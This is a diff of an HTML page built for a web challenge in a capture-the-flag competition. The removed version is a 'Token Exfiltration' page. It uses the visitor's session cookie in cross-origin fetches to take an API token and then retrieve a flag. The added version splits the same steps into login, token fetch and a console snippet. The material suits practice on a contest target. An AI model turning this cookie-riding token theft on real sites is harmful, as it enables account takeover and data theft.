@@ -2,79 +2,82 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PointerOverflow CTF - Exfiltrate Token</title>
+  <title>PointerOverflow CTF - Token Fetcher</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: system-ui, sans-serif; margin: 2rem; }
     h1 { color: #2a7ae2; }
-    button { font-size: 1rem; padding: 0.5rem 1rem; margin: 0.5rem 0; }
-    pre { background: #f4f4f4; padding: 1rem; overflow-x: auto; }
+    button { font-size: 1rem; padding: 0.5rem 1rem; margin-top: 1rem; }
+    p { margin-top: 1rem; }
+    input { width: 100%; padding: 0.5rem; margin-top: 0.5rem; }
   </style>
 </head>
 <body>
-  <h1>PointerOverflow CTF - Token Exfiltration</h1>
+  <h1>PointerOverflow CTF - Token Fetcher</h1>
 
-  <button id="fetchTokenBtn">Fetch Token</button>
-  <button id="fetchFlagBtn" disabled>Fetch Flag</button>
+  <button id="loginBtn">Login</button>
+  <button id="tokenBtn" disabled>Fetch Token</button>
 
-  <p>Status: <span id="status">Idle</span></p>
+  <p id="status"></p>
 
-  <pre id="output"></pre>
+  <label for="tokenInput">Your Token:</label>
+  <input type="text" id="tokenInput" readonly>
+
+  <p>Once you have your token, open a new tab to <code>/api/flag</code> and paste the token in the console:</p>
+  <pre>
+fetch(location.href, {
+  headers: { "X-Flag-Token": "PASTE_YOUR_TOKEN_HERE" },
+  credentials: "include"
+}).then(r => r.text()).then(console.log)
+  </pre>
 
   <script>
+    const loginBtn = document.getElementById('loginBtn');
+    const tokenBtn = document.getElementById('tokenBtn');
     const statusEl = document.getElementById('status');
-    const outputEl = document.getElementById('output');
-    const fetchTokenBtn = document.getElementById('fetchTokenBtn');
-    const fetchFlagBtn = document.getElementById('fetchFlagBtn');
-
-    let apiToken = '';
+    const tokenInput = document.getElementById('tokenInput');
 
     const log = (msg) => {
       console.log(msg);
       statusEl.textContent = msg;
     };
 
-    fetchTokenBtn.onclick = async () => {
-      log("Fetching token from target site...");
-      try {
-        const res = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
-          credentials: 'include' // important to include the user's session cookie
-        });
+    loginBtn.onclick = async () => {
+      loginBtn.disabled = true;
+      log("Logging in...");
 
-        if (!res.ok) throw new Error("Token request failed");
+      const res = await fetch('https://web200-1.pointeroverflowctf.com/login', {
+        method: 'POST',
+        credentials: 'include'
+      });
 
-        const data = await res.json();
-        apiToken = data.apiToken;
-        log("Token fetched! You can now fetch the flag.");
-        outputEl.textContent = `Token: ${apiToken}`;
-        fetchFlagBtn.disabled = false;
-
-      } catch (err) {
-        log("Failed to fetch token.");
-        outputEl.textContent = err;
+      if (!res.ok) {
+        log("Login failed!");
+        loginBtn.disabled = false;
+        return;
       }
+
+      log("Login successful. Session cookie set.");
+      tokenBtn.disabled = false;
     };
 
-    fetchFlagBtn.onclick = async () => {
-      if (!apiToken) return;
+    tokenBtn.onclick = async () => {
+      tokenBtn.disabled = true;
+      log("Fetching token...");
 
-      log("Fetching flag with X-Flag-Token...");
-      try {
-        const res = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
-          headers: {
-            'X-Flag-Token': apiToken
-          },
-          credentials: 'include'
-        });
+      const res = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
+        credentials: 'include'
+      });
 
-        const text = await res.text();
-        log("Flag fetched!");
-        outputEl.textContent = `Flag response:\n${text}`;
-
-      } catch (err) {
-        log("Failed to fetch flag.");
-        outputEl.textContent = err;
+      if (!res.ok) {
+        log("Failed to fetch token!");
+        tokenBtn.disabled = false;
+        return;
       }
+
+      const data = await res.json();
+      tokenInput.value = data.apiToken;
+      log("Token fetched! Copy it to use on /api/flag.");
     };
   </script>
 </body>
